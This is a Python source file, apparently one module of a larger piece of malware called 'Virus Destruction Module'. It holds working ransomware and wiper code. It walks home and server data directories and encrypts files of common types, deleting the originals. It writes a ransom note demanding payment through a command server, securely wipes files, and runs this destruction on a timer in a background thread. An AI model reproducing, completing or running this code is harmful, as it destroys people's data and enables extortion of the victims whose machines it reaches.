#!/usr/bin/env python3
"""
Virus Destruction Module - File System Encryption and Wiping
"""
import os
import sys
import threading
import time
import hashlib
import base64
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from virus_config import *
from virus_utils import log_activity

# Global encryption key (derived from C2_KEY)
_encryption_key = None
_fernet = None

def generate_encryption_key(password=None):
    """Generate a strong encryption key using PBKDF2"""
    global _encryption_key, _fernet
    
    if password is None:
        password = C2_KEY
    
    # Use PBKDF2 to derive key from password
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,
        salt=b'virus_salt_2024',  # Fixed salt for consistency
        iterations=100000,
    )
    key = base64.urlsafe_b64encode(kdf.derive(password.encode()))
    _encryption_key = key
    _fernet = Fernet(key)
    return key

def encrypt_file(file_path, key=None):
    """Encrypt a single file using AES (Fernet)"""
    global _fernet
    
    try:
        if _fernet is None:
            generate_encryption_key(key)
        
        # Read file content
        with open(file_path, 'rb') as f:
            file_data = f.read()
        
        # Encrypt data
        encrypted_data = _fernet.encrypt(file_data)
        
        # Write encrypted data back to file with .encrypted extension
        encrypted_path = file_path + '.encrypted'
        with open(encrypted_path, 'wb') as f:
            f.write(encrypted_data)
        
        # Delete original file
        os.remove(file_path)
        
        # Create ransom note
        ransom_note_path = os.path.dirname(file_path) + '/README_RECOVER.txt'
        if not os.path.exists(ransom_note_path):
            ransom_note = f"""
╔══════════════════════════════════════════════════════════════╗
║                    YOUR FILES ARE ENCRYPTED                   ║
╚══════════════════════════════════════════════════════════════╝

All your files have been encrypted with military-grade encryption.

To recover your files, you need to:
1. Contact us at: [C2_SERVER]
2. Provide the following key: {hashlib.md5(C2_KEY.encode()).hexdigest()}
3. Pay the ransom to receive decryption key

Your files are safe, but inaccessible without the decryption key.

DO NOT:
- Try to decrypt files yourself
- Delete .encrypted files
- Restart your computer

Time encrypted: {time.strftime("%Y-%m-%d %H:%M:%S")}
"""
            try:
                with open(ransom_note_path, 'w', encoding='utf-8') as f:
                    f.write(ransom_note)
            except:
                pass
        
        return True
    except Exception as e:
        log_activity("DESTRUCTION", f"Error encrypting {file_path}: {e}")
        return False

def decrypt_file(encrypted_path, key=None):
    """Decrypt a single file"""
    global _fernet
    
    try:
        if _fernet is None:
            generate_encryption_key(key)
        
        # Read encrypted file
        with open(encrypted_path, 'rb') as f:
            encrypted_data = f.read()
        
        # Decrypt data
        decrypted_data = _fernet.decrypt(encrypted_data)
        
        # Write decrypted data to original path
        original_path = encrypted_path.replace('.encrypted', '')
        with open(original_path, 'wb') as f:
            f.write(decrypted_data)
        
        # Remove encrypted file
        os.remove(encrypted_path)
        
        return True
    except Exception as e:
        log_activity("DESTRUCTION", f"Error decrypting {encrypted_path}: {e}")
        return False

def wipe_file(file_path, passes=3):
    """Securely wipe a file by overwriting with random data"""
    try:
        file_size = os.path.getsize(file_path)
        
        with open(file_path, 'r+b') as f:
            for pass_num in range(passes):
                # Write random data
                f.seek(0)
                random_data = os.urandom(file_size)
                f.write(random_data)
                f.flush()
                os.fsync(f.fileno())
        
        # Delete file
        os.remove(file_path)
        return True
    except Exception as e:
        log_activity("DESTRUCTION", f"Error wiping {file_path}: {e}")
        return False

def should_skip_path(path):
    """Check if path should be skipped (system critical or virus files)"""
    # Normalize path
    path = os.path.abspath(path)
    
    # Skip virus's own files
    virus_dir = os.path.dirname(os.path.abspath(__file__))
    if path.startswith(virus_dir):
        return True
    
    # Skip system critical directories (for safety in test environment)
    skip_patterns = [
        '/proc', '/sys', '/dev', '/run', '/tmp',
        '/boot', '/lost+found',
        '/snap',  # Snap packages
    ]
    
    for pattern in skip_patterns:
        if path.startswith(pattern):
            return True
    
    # Skip already encrypted files
    if path.endswith('.encrypted'):
        return True
    
    # Skip hidden system files
    basename = os.path.basename(path)
    if basename.startswith('.') and basename in ['.bashrc', '.profile', '.bash_history']:
        return True
    
    return False

def get_target_directories():
    """Get list of target directories for encryption/wiping"""
    targets = []
    
    # User home directories
    home_dirs = [
        os.path.expanduser('~'),
        '/home',
    ]
    
    for home_dir in home_dirs:
        if os.path.exists(home_dir):
            targets.append(home_dir)
    
    # Common data directories
    data_dirs = [
        '/opt',
        '/usr/local',
        '/srv',
        '/var/www',
        '/var/lib',
    ]
    
    for data_dir in data_dirs:
        if os.path.exists(data_dir):
            targets.append(data_dir)
    
    # Desktop, Documents, Downloads in home
    user_home = os.path.expanduser('~')
    for subdir in ['Desktop', 'Documents', 'Downloads', 'Pictures', 'Videos', 'Music']:
        subdir_path = os.path.join(user_home, subdir)
        if os.path.exists(subdir_path):
            targets.append(subdir_path)
    
    return targets

def encrypt_filesystem(target_dirs=None, file_extensions=None, max_files=None):
    """Encrypt files in target directories"""
    if not ENABLE_FILESYSTEM_ENCRYPTION:
        return
    
    if target_dirs is None:
        target_dirs = get_target_directories()
    
    if file_extensions is None:
        # Common file extensions to encrypt
        file_extensions = [
            '.txt', '.doc', '.docx', '.pdf', '.xls', '.xlsx',
            '.ppt', '.pptx', '.jpg', '.jpeg', '.png', '.gif',
            '.mp3', '.mp4', '.avi', '.mov', '.zip', '.rar',
            '.7z', '.tar', '.gz', '.sql', '.db', '.sqlite',
            '.py', '.js', '.html', '.css', '.json', '.xml',
            '.cpp', '.c', '.h', '.java', '.php', '.rb',
        ]
    
    encrypted_count = 0
    error_count = 0
    
    log_activity("DESTRUCTION", f"Starting filesystem encryption on {len(target_dirs)} directories...")
    
    for target_dir in target_dirs:
        if should_skip_path(target_dir):
            continue
        
        try:
            for root, dirs, files in os.walk(target_dir):
                # Skip certain directories
                dirs[:] = [d for d in dirs if not should_skip_path(os.path.join(root, d))]
                
                for file in files:
                    if max_files and encrypted_count >= max_files:
                        log_activity("DESTRUCTION", f"Reached max files limit: {max_files}")
                        return
                    
                    file_path = os.path.join(root, file)
                    
                    if should_skip_path(file_path):
                        continue
                    
                    # Check file extension
                    _, ext = os.path.splitext(file)
                    if ext.lower() in file_extensions or not file_extensions:
                        try:
                            if encrypt_file(file_path):
                                encrypted_count += 1
                                if encrypted_count % 100 == 0:
                                    log_activity("DESTRUCTION", f"Encrypted {encrypted_count} files...")
                        except:
                            error_count += 1
        except Exception as e:
            log_activity("DESTRUCTION", f"Error processing {target_dir}: {e}")
            error_count += 1
    
    log_activity("DESTRUCTION", f"Encryption complete: {encrypted_count} files encrypted, {error_count} errors")

def wipe_filesystem(target_dirs=None, file_extensions=None, max_files=None):
    """Wipe (securely delete) files in target directories"""
    if not ENABLE_FILESYSTEM_WIPING:
        return
    
    if target_dirs is None:
        target_dirs = get_target_directories()
    
    wiped_count = 0
    error_count = 0
    
    log_activity("DESTRUCTION", f"Starting filesystem wiping on {len(target_dirs)} directories...")
    
    for target_dir in target_dirs:
        if should_skip_path(target_dir):
            continue
        
        try:
            for root, dirs, files in os.walk(target_dir):
                # Skip certain directories
                dirs[:] = [d for d in dirs if not should_skip_path(os.path.join(root, d))]
                
                for file in files:
                    if max_files and wiped_count >= max_files:
                        log_activity("DESTRUCTION", f"Reached max files limit: {max_files}")
                        return
                    
                    file_path = os.path.join(root, file)
                    
                    if should_skip_path(file_path):
                        continue
                    
                    # Check file extension
                    _, ext = os.path.splitext(file)
                    if ext.lower() in file_extensions if file_extensions else True:
                        try:
                            if wipe_file(file_path):
                                wiped_count += 1
                                if wiped_count % 100 == 0:
                                    log_activity("DESTRUCTION", f"Wiped {wiped_count} files...")
                        except:
                            error_count += 1
        except Exception as e:
            log_activity("DESTRUCTION", f"Error processing {target_dir}: {e}")
            error_count += 1
    
    log_activity("DESTRUCTION", f"Wiping complete: {wiped_count} files wiped, {error_count} errors")

def destruction_worker():
    """Background worker for periodic filesystem destruction"""
    if not (ENABLE_FILESYSTEM_ENCRYPTION or ENABLE_FILESYSTEM_WIPING):
        return
    
    # Wait before starting destruction
    time.sleep(DESTRUCTION_DELAY)
    
    while True:
        try:
            if ENABLE_FILESYSTEM_ENCRYPTION:
                encrypt_filesystem(max_files=DESTRUCTION_BATCH_SIZE)
            
            if ENABLE_FILESYSTEM_WIPING:
                wipe_filesystem(max_files=DESTRUCTION_BATCH_SIZE)
            
            # Wait before next batch
            time.sleep(DESTRUCTION_INTERVAL)
        except Exception as e:
            log_activity("DESTRUCTION", f"Error in destruction worker: {e}")
            time.sleep(DESTRUCTION_INTERVAL)

def start_destruction():
    """Start filesystem destruction in background thread"""
    if ENABLE_FILESYSTEM_ENCRYPTION or ENABLE_FILESYSTEM_WIPING:
        destruction_thread = threading.Thread(target=destruction_worker, daemon=True)
        destruction_thread.start()
        log_activity("DESTRUCTION", "Filesystem destruction module activated")
        return destruction_thread
    return None

